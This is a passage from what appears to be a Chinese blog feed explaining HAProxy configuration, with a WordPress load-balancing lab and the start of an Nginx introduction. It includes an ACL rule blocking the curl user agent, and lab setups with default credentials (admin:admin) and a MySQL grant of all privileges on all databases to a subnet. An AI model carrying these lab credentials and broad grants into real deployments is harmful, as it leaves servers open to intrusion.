class="line">option httpchk &lt;uri&gt;</span><br><span class="line">option httpchk &lt;method&gt; &lt;uri&gt;</span><br><span class="line">option httpchk &lt;method&gt; &lt;uri&gt; &lt;version&gt;</span><br><span class="line">#用于定义应用层检测方法</span><br><span class="line">http-check expect [!] &lt;match&gt; &lt;pattern&gt;</span><br></pre></td></tr></table></figure><ul><li>修改报文头部</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">reqadd  &lt;string&gt; [&#123;if | unless&#125; &lt;cond&gt;] 在HTTP请求的末尾添加标头</span><br><span class="line">rspadd  &lt;string&gt; [&#123;if | unless&#125; &lt;cond&gt;] 在HTTP响应的末尾添加标头</span><br><span class="line">reqdel  &lt;search&gt; [&#123;if | unless&#125; &lt;cond&gt;] 删除与HTTP请求中的正则表达式匹配的所有标头</span><br><span class="line">reqidel &lt;search&gt; [&#123;if | unless&#125; &lt;cond&gt;]  (ignore case)</span><br><span class="line">rspdel  &lt;search&gt; [&#123;if | unless&#125; &lt;cond&gt;] 删除与HTTP响应中的正则表达式匹配的所有标头</span><br><span class="line">rspidel &lt;search&gt; [&#123;if | unless&#125; &lt;cond&gt;]  (ignore case)</span><br><span class="line"></span><br><span class="line">#删除响应报文中的Server字段信息</span><br><span class="line">rspidel  Server.*</span><br></pre></td></tr></table></figure><ul><li><h4 id="errorfile-和-errorloc"><a href="#errorfile-和-errorloc" class="headerlink" title="errorfile 和 errorloc"></a>errorfile 和 errorloc</h4></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">errorfile &lt;code&gt; &lt;file&gt;</span><br><span class="line">errorloc &lt;code&gt; &lt;url&gt;</span><br><span class="line">errorloc302 &lt;code&gt; &lt;url&gt;</span><br><span class="line"></span><br><span class="line">#code：HTTP状态代码。 目前HAProxy能够支持的代码：</span><br><span class="line">200, 400, 403, 408, 500, 502, 503, and 504</span><br><span class="line">#file：指定包含完整HTTP响应的文件</span><br><span class="line"></span><br><span class="line">errorfile 400 /etc/haproxy/errorfiles/400badreq.http</span><br><span class="line">errorfile 408 /dev/null  #解决方法Chrome预连接错误</span><br><span class="line">errorfile 403 /etc/haproxy/errorfiles/403forbid.http</span><br><span class="line">errorfile 503 /etc/haproxy/errorfiles/503sorry.http</span><br></pre></td></tr></table></figure><ul><li>统计接口</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">统计接口启用相关的参数：</span><br><span class="line">stats enable</span><br><span class="line">启用统计页；基于默认的参数启用stats page；</span><br><span class="line">- stats uri   : /haproxy?stats</span><br><span class="line">- stats realm : &quot;HAProxy Statistics&quot;</span><br><span class="line">- stats auth  : no authentication</span><br><span class="line">- stats scope : no restriction</span><br><span class="line"></span><br><span class="line">stats auth &lt;user&gt;:&lt;passwd&gt;</span><br><span class="line">认证时的账号和密码，可使用多次；</span><br><span class="line"></span><br><span class="line">stats realm &lt;realm&gt;</span><br><span class="line">认证时的realm；</span><br><span class="line"></span><br><span class="line">stats uri &lt;prefix&gt;</span><br><span class="line">自定义stats page uri</span><br><span class="line"></span><br><span class="line">stats refresh &lt;delay&gt;</span><br><span class="line">设定自动刷新时间间隔；</span><br><span class="line"></span><br><span class="line">stats admin &#123; if | unless &#125; &lt;cond&gt;</span><br><span class="line">启用stats page中的管理功能</span><br><span class="line"></span><br><span class="line">配置示例：</span><br><span class="line">listen stats</span><br><span class="line">bind :9099</span><br><span class="line">stats enable</span><br><span class="line">stats realm HAPorxy\ Stats\ Page</span><br><span class="line">stats auth admin:admin</span><br><span class="line">stats admin if TRUE</span><br></pre></td></tr></table></figure><h1 id="ACL"><a href="#ACL" class="headerlink" title="ACL"></a>ACL</h1><p>访问控制列表的使用提供了一种灵活的解决方案来执行内容切换，并且通常基于从请求，响应或任何环境状态中提取的内容来做出决策</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">acl &lt;aclname&gt; &lt;criterion&gt; [flags] [operator] [&lt;value&gt;] ...</span><br></pre></td></tr></table></figure><ul><li>aclname：ACL名称必须由大写和小写字母，数字，’ – ‘（短划线），’_’（下划线），’.’ 组成。ACL名称区分大小写</li><li>value：值</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">boolean 布尔型</span><br><span class="line">integer or integer range 整数或整数范围</span><br><span class="line">IP address / network IP或网络地址</span><br><span class="line">string (exact精确匹配, substring子串匹配, suffix前缀匹配, prefix后缀匹配, subdir子路径匹配, domain子域名匹配) 字符串匹配</span><br><span class="line">regular expression 正则表示式匹配</span><br><span class="line">hex block 16进制的块匹配</span><br></pre></td></tr></table></figure><ul><li>flags：标志</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-i : 忽略字符大小写</span><br><span class="line">-m : 特定的模式</span><br><span class="line">-n : 禁止DNS解析</span><br><span class="line">-u : 要求acl使用唯一的名称</span><br></pre></td></tr></table></figure><ul><li>operator：操作符</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">匹配整数值：eq、ge、gt、le、lt</span><br><span class="line">匹配字符串：</span><br><span class="line">    exact match 精确匹配</span><br><span class="line">    substring match 子串匹配</span><br><span class="line">    prefix match 前缀匹配</span><br><span class="line">    suffix match 后缀匹配</span><br><span class="line">    subdir match 子路径匹配</span><br><span class="line">    domain match 子域名匹配</span><br></pre></td></tr></table></figure><ul><li>acl作为条件时的逻辑关系：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if invalid_src invalid_port  或关系</span><br><span class="line">if invalid_src || invalid_port  与关系</span><br><span class="line">if ! invalid_src invalid_port  非invalid_src</span><br></pre></td></tr></table></figure><ul><li>检查URL的路径</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">path     : 精确匹配</span><br><span class="line">path_beg : 前缀匹配</span><br><span class="line">path_dir : 子串匹配</span><br><span class="line">path_dom : 子域名匹配</span><br><span class="line">path_end : 路径后缀匹配</span><br><span class="line">path_len : 路径长度匹配</span><br><span class="line">path_reg : 路径的正则表达式模式匹配</span><br><span class="line">path_sub : 路径的子字串匹配</span><br></pre></td></tr></table></figure><ul><li>整个URL检查</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">url     : 精确匹配</span><br><span class="line">url_beg : 前缀匹配</span><br><span class="line">url_dir : 子串匹配</span><br><span class="line">url_dom : 子域名匹配</span><br><span class="line">url_end : 后缀匹配</span><br><span class="line">url_len : 长度匹配</span><br><span class="line">url_reg : 正则表达式匹配</span><br><span class="line">url_sub : 子字串匹配</span><br></pre></td></tr></table></figure><ul><li>请求报文的指定头部检查</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">req.hdr([&lt;name&gt;[,&lt;occ&gt;]]) : string</span><br><span class="line">This extracts the last occurrence of header &lt;name&gt; in an HTTP request.</span><br><span class="line"></span><br><span class="line">hdr([&lt;name&gt;[,&lt;occ&gt;]])     : exact string match</span><br><span class="line">hdr_beg([&lt;name&gt;[,&lt;occ&gt;]]) : prefix match</span><br><span class="line">hdr_dir([&lt;name&gt;[,&lt;occ&gt;]]) : subdir match</span><br><span class="line">hdr_dom([&lt;name&gt;[,&lt;occ&gt;]]) : domain match</span><br><span class="line">hdr_end([&lt;name&gt;[,&lt;occ&gt;]]) : suffix match</span><br><span class="line">hdr_len([&lt;name&gt;[,&lt;occ&gt;]]) : length match</span><br><span class="line">hdr_reg([&lt;name&gt;[,&lt;occ&gt;]]) : regex match</span><br><span class="line">hdr_sub([&lt;name&gt;[,&lt;occ&gt;]]) : substring match</span><br><span class="line"></span><br><span class="line">示例：</span><br><span class="line">acl bad_curl hdr_sub(User-Agent) -i curl</span><br><span class="line">block if bad_curl</span><br></pre></td></tr></table></figure><ul><li>示例：阻止curl访问</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frontend web *:80</span><br><span class="line">    acl bad_curl hdr_sub(User-Agent) -i curl</span><br><span class="line">    block if bad_curl</span><br><span class="line">    default_backend appsrvs</span><br></pre></td></tr></table></figure><ul><li>示例:</li></ul><ol><li>配置简单的动静分离</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">]# cp /etc/haproxy/haproxy.cfg&#123;.bak&#125;</span><br><span class="line">]# vim /etc/haproxy/haproxy.cfg</span><br><span class="line">global</span><br><span class="line">log 127.0.0.1 local2</span><br><span class="line">···</span><br><span class="line">frontend main *:80</span><br><span class="line">    mode http</span><br><span class="line">    default_backend websrvs</span><br><span class="line"></span><br><span class="line">backend websrvs</span><br><span class="line">    balance roundrobin</span><br><span class="line">    server websrv1 192.168.1.20:80 check</span><br><span class="line">    server websrv2 192.168.1.8:80 check</span><br></pre></td></tr></table></figure><ol start="2"><li>apache服务的搭建</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~]#yum install -y httpd</span><br><span class="line">~]#echo srv1 &gt; /var/www/html/index.html</span><br><span class="line">~]#systemctl start httpd</span><br><span class="line"></span><br><span class="line">~]#yum install -y httpd</span><br><span class="line">~]#echo srv2 &gt; /var/www/html/index.html</span><br><span class="line">~]#systemctl start httpd</span><br></pre></td></tr></table></figure><ol start="3"><li>测试均衡调度</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">~]#for i in &#123;1..10&#125;;do curl 192.168.1.18;done</span><br><span class="line">srv1</span><br><span class="line">srv2</span><br><span class="line">srv1</span><br><span class="line">srv2</span><br><span class="line">srv1</span><br><span class="line">srv2</span><br><span class="line">srv1</span><br><span class="line">srv2</span><br><span class="line">srv1</span><br><span class="line">srv2</span><br></pre></td></tr></table></figure><h1 id="实验wordpress的负载均衡"><a href="#实验wordpress的负载均衡" class="headerlink" title="实验wordpress的负载均衡"></a>实验wordpress的负载均衡</h1><p>需求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http:</span><br><span class="line">  (1) 动静分离部署wordpress，动静都要能实现负载均衡，要注意会话的问题；</span><br><span class="line">  (2) 给出设计拓扑，写成博客；</span><br><span class="line">  (3) haproxy的设定要求：</span><br><span class="line">  (a) stats page，要求仅能通过本地访问使用管理接口； </span><br><span class="line">  (b) 动静分离；</span><br><span class="line">  (c) 分别考虑不同的服务器组的调度算法；</span><br><span class="line">  (d) 压缩合适的内容类型；</span><br></pre></td></tr></table></figure></p><p><img src="C:\Users\hongfeng\AppData\Local\Temp\1531141099688.png" alt="1531141099688"></p><ul><li>首先，在192.168.1.8/24上实现lamp架构</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">1. 安装必要的软件</span><br><span class="line">]# yum install -y mariadb-server httpd php-fpm php-mysql</span><br><span class="line">]# wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz</span><br><span class="line">]# tar xf wordpress-4.9.4-zh_CN.tar.gz -C /var/www/html</span><br><span class="line">]# chown -R apache.apache  /var/www/html/*</span><br><span class="line">]# cd /var/www/html/</span><br><span class="line">]# cp wp-config-sample.php wp-config.php</span><br><span class="line">]# vim wp-config.php </span><br><span class="line">define(&apos;DB_NAME&apos;, &apos;wpdb&apos;);</span><br><span class="line">/** MySQL数据库用户名 */</span><br><span class="line">define(&apos;DB_USER&apos;, &apos;test&apos;);</span><br><span class="line">/** MySQL数据库密码 */</span><br><span class="line">define(&apos;DB_PASSWORD&apos;, &apos;centos&apos;);</span><br><span class="line">/** MySQL主机 */</span><br><span class="line">define(&apos;DB_HOST&apos;, &apos;127.0.0.1&apos;);</span><br><span class="line">2. 修改http配置文件</span><br><span class="line">]# vim /etc/httpd/conf.d/fcgi.conf</span><br><span class="line">DirectoryIndex index.php</span><br><span class="line">ProxyRequests Off</span><br><span class="line">ProxyPassMatch ^/(.*\.php)$ fcgi://127.0.0.1:9000/var/www/html/$1 </span><br><span class="line">3. 授权mysql账户</span><br><span class="line">]# systemctl start mariadb httpd</span><br><span class="line">]# mysql -e &quot;grant all on *.* to test@&apos;192.168.1.%&apos; identified by &apos;centos&apos;&quot;</span><br><span class="line">]# mysql -e &apos;flush privileges&apos;</span><br><span class="line">4. 启动服务</span><br><span class="line">]# systemctl start httpd</span><br><span class="line">]# systemctl start php-fpm</span><br><span class="line">]# systemctl start mariadb</span><br><span class="line">5. 测试动静分离，停止服务，依旧能访问另一他台服务器的静态资源</span><br><span class="line">]# systemctl stop httpd</span><br></pre></td></tr></table></figure><ul><li>其次，在192.168.1.20/24上实现静态资源</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">]# yum install -y httpd</span><br><span class="line">]# wget https://cn.wordpress.org/wordpress-4.9.4-zh_CN.tar.gz</span><br><span class="line">]# tar xf wordpress-4.9.4-zh_CN.tar.gz -C /var/www/html</span><br><span class="line">]# chown -R apache.apache  /var/www/html/*</span><br></pre></td></tr></table></figure><ul><li>最后，在haproxy服务器上配置动静分离</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">]# yum install -y haproaxy</span><br><span class="line">]# cp /etc/haproxy/haproxy.cfg&#123;,.bak&#125;</span><br><span class="line">]# vim /etc/haproxy/haproxy.cfg</span><br><span class="line">···</span><br><span class="line">frontend main *:80</span><br><span class="line">    mode http</span><br><span class="line">    acl url_static path_beg -i /static /images /javascript /stylesheets</span><br><span class="line">    acl url_static path_end -i .jpg .gif .png .css .js .html .txt .htm</span><br><span class="line"></span><br><span class="line">    use_backend staticsrvs  if url_static </span><br><span class="line">    default_backend phpsrvs</span><br><span class="line"></span><br><span class="line">backend staticsrvs</span><br><span class="line">    balance roundrobin</span><br><span class="line">    #option httpchk GET /test1.html</span><br><span class="line">    #cookie WEBSRV insert nocache indirect</span><br><span class="line">    #server websrv1 192.168.1.20:80 weight 2 check cookie websrv1</span><br><span class="line">    #server websrv2 192.168.1.8:80 weight 1 check cookie websrv2</span><br><span class="line">    server websrv2 192.168.1.8:80 check</span><br><span class="line"></span><br><span class="line">backend phpsrvs</span><br><span class="line">    balance roundrobin</span><br><span class="line">    server websrv1 192.168.1.20:80 check</span><br><span class="line"></span><br><span class="line">listen stats</span><br><span class="line">    bind 127.0.0.1:80                                                           </span><br><span class="line">    stats enable</span><br><span class="line">    stats uri /admin?stats</span><br><span class="line">    stats realm HAProxy\ Stats</span><br><span class="line">    stats auth admin:admin</span><br><span class="line">    stats admin if TRUE</span><br></pre></td></tr></table></figure><h1 id="常用功能实现"><a href="#常用功能实现" class="headerlink" title="常用功能实现"></a>常用功能实现</h1><ol><li>压缩</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frontend web *:80</span><br><span class="line">    default_backend appsrvs</span><br><span class="line">    compression algo gzip</span><br><span class="line">    compression type text/html text/plain</span><br><span class="line">backend appsrvs</span><br><span class="line">    balance roundrobin</span><br><span class="line">    server app1 192.168.0.10:80 check</span><br><span class="line">    server app2 192.168.0.11:80 check</span><br></pre></td></tr></table></figure><ol start="2"><li>stats page</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">listen stats</span><br><span class="line">    bind :8080</span><br><span class="line">    stats realm &quot;HAProxy Stats Page&quot;</span><br><span class="line">    stats auth admin:adminpass  #认证用户：密码</span><br><span class="line">    stats admin if TRUE</span><br><span class="line">访问：http://192.168.0.8:8080/haproxy?stats进入状态管理页</span><br></pre></td></tr></table></figure><ol start="3"><li>自定义错误页</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[root@haproxy ~]# vim /etc/haproxy/haproxy.cfg</span><br><span class="line">frontend web *:80</span><br><span class="line">        default_backend appsrvs</span><br><span class="line">        acl bad_guy src 192.168.0.7</span><br><span class="line">        block if bad_guy</span><br><span class="line">        errorfile 403 /etc/haproxy/errorfiles/403forbid.http</span><br><span class="line">backend appsrvs</span><br><span class="line">        balance roundrobin</span><br><span class="line">        server app1 192.168.0.10:80 check</span><br><span class="line">        server app2 192.168.0.11:80 check</span><br><span class="line">[root@haproxy ~]# mkdir /etc/haproxy/errorfiles/ -p</span><br><span class="line">[root@haproxy ~]# echo &apos;forbid&apos; &gt;/etc/haproxy/errorfiles/403forbid.http</span><br><span class="line">[root@haproxy ~]# systemctl restart haproxy</span><br><span class="line">[root@client ~]# curl http://192.168.0.8/</span><br><span class="line">forbid</span><br></pre></td></tr></table></figure><ol start="4"><li>访问控制</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">listen stats</span><br><span class="line">    bind :8080</span><br><span class="line">    stats realm &quot;HAProxy Stats Page&quot;</span><br><span class="line">    stats auth admin:adminpass</span><br><span class="line">    stats admin if TRUE</span><br><span class="line">    acl admin_client src 192.168.0.254</span><br><span class="line">    block unless admin_client  #只允许192.168.0.254访问状态管理页</span><br></pre></td></tr></table></figure><ol start="5"><li>日志功能</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">调度器中配置</span><br><span class="line">[root@haproxy ~]# vim /etc/haproxy/haproxy.cfg </span><br><span class="line">backend appsrvs</span><br><span class="line">    balance roundrobin</span><br><span class="line">    option forwardfor</span><br><span class="line">    server app1 192.168.0.10:80 check</span><br><span class="line">    server app2 192.168.0.11:80 check</span><br><span class="line">[root@haproxy haproxy]# systemctl restart haproxy.service</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">后端服务器配置（Apache）</span><br><span class="line">[root@web2 ~]# vim /etc/httpd/conf/httpd.conf</span><br><span class="line">LogFormat &quot;%&#123;X-Forwarded-For&#125;i %l %u %t \&quot;%r\&quot; %&gt;s %b \&quot;%&#123;Referer&#125;i\&quot; \&quot;%&#123;User-Agent</span><br><span class="line">&#125;i\&quot;&quot; combined  #改变日志记录方式</span><br><span class="line">[root@web2 ~]# systemctl restart httpd</span><br><span class="line">[root@web2 ~]# tail -f /var/log/httpd/access_log</span><br></pre></td></tr></table></figure><ol start="6"><li>基于cookie的session粘滞</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[root@haproxy ~]# vim /etc/haproxy/haproxy.cfg</span><br><span class="line">frontend web *:80</span><br><span class="line">    mode http</span><br><span class="line">    default_backend appsrvs</span><br><span class="line">backend appsrvs</span><br><span class="line">    balance roundrobin</span><br><span class="line">    option forwardfor</span><br><span class="line">    cookie WEBSRV insert nocache indirect</span><br><span class="line">    server app1 192.168.0.10:80 check inter 1000 rise 1 fall 2 maxconn 2000 cookie websrv1</span><br><span class="line">    server app2 192.168.0.11:80 check maxconn 1500 cookie websrv2</span><br><span class="line">[root@client ~]# curl -b &quot;WEBSRV=websrv1&quot; http://192.168.0.8/</span><br><span class="line">web1</span><br><span class="line">[root@client ~]# curl -b &quot;WEBSRV=websrv2&quot; http://192.168.0.8/ </span><br><span class="line">web2</span><br></pre></td></tr></table></figure><ol start="7"><li>后端主机的健康状态检测</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">backend appsrvs</span><br><span class="line">    balance roundrobin</span><br><span class="line">    option httpchk GET /test.html</span><br><span class="line">    server app1 192.168.0.10:80 check </span><br><span class="line">    server app2 192.168.0.11:80 check</span><br></pre></td></tr></table></figure><ol start="8"><li>请求和响应报文首部的操纵：替换响应报文的Server字段信息</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@haproxy ~]# vim /etc/haproxy/haproxy.cfg</span><br><span class="line">frontend web *:80</span><br><span class="line">    mode http</span><br><span class="line">    rspidel ^Server:.*</span><br><span class="line">    rspadd Server:\ Apache\ or\ Nginx</span><br><span class="line">    default_backend appsrvs</span><br><span class="line">[root@client ~]# curl -I http://192.168.0.8/</span><br><span class="line">Server: Apache or Nginx  #掩人耳目</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla
      
    
    </summary>
    
      <category term="HAProxy" scheme="https://fenghong.tech/categories/HAProxy/"/>
    
    
      <category term="server" scheme="https://fenghong.tech/tags/server/"/>
    
      <category term="Linux" scheme="https://fenghong.tech/tags/Linux/"/>
    
      <category term="internet" scheme="https://fenghong.tech/tags/internet/"/>
    
  </entry>
  
  <entry>
    <title>Nginx</title>
    <link href="https://fenghong.tech/Nginx.html"/>
    <id>https://fenghong.tech/Nginx.html</id>
    <published>2018-07-08T11:59:32.000Z</published>
    <updated>2018-11-07T11:31:40.440Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>摘要：</p><ul><li>Nginx简介</li><li>源码编译安装Nginx</li><li>Nginx服务器性能优化</li><li>Nginx模块介绍</li></ul><h1 id="Nginx简介"><a href="#Nginx简介" class="headerlink" title="Nginx简介"></a>Nginx简介</h1><p>​    Nginx（发音同engine x）是一个异步框架的 Web服务器，也可以用作反向代理，负载平衡器 和 HTTP缓存。该软件由 Igor Sysoev 创建，并于2004年首次公开发布。同名公司成立于2011年，以提供支持。</p><p>NGINX是免费，开源，高性能的HTTP和反向代理服务器，邮件代理服务器，通用TCP/UDP代理服务器</p><p>Nginx在官方测试的结果中，能够支持五万个并行连接，而在实际的运作中，可以支持二万至四万个并行连接。</p><p>Nginx 的编写有一个明确目标就是超越 Apache Web 服务器的性能。Nginx 提供开箱即用的静态文件，使用的内存比 Apache 少得多，每秒可以处理大约四倍于 Apache 的请求。低并发下性能与 Apache 相当，有时候还低于，但是在高并发下 Nginx 能保持低资源低消耗高性能。还有高度模块化的设计，模块编写简单。配置文件简洁。</p><p>官网：<code>http://nginx.org</code></p><p>文档：<code>https://nginx.org/en/docs/</code></p><p>特性：</p><ul><li>模块化设计，较好的扩展性</li><li>高可靠性</li><li>支持热部署：不停机更新配置文件、升级版本、更换日志文件</li><li>低内存消耗：10000个keep-alive连接模式下的非活动连接，仅需2.5M内存</li><li>event-driven（事件驱动）、aio（异步IO）、mmap（内存映射）、sendfile</li></ul><p>功能：</p><ul><li>静态资源的web服务器，html，图片，js，css，txt等静态资源</li><li>http协议反向代理服务器</li><li>pop3/imap4协议反向代理服务器</li><li>FastCGI(LNMP)、uWSGI(python)等协议</li><li>模块化（非DSO），如zip、SSL模块</li></ul><p>web服务功能：</p><ul><li>虚拟主机（server）</li><li>支持 keep-alive 和管道连接</li><li>访问日志（支持基于日志缓冲提高其性能）</li><li>url重写（rewirte）</li><li>路径别名</li><li>基于IP及用户的访问控制</li><li>支持速率限制及并发数限制</li><li>重新配置和在线升级而无须中断客户的工作进程</li><li>Memcached 的 GET 接口</li></ul><p><img 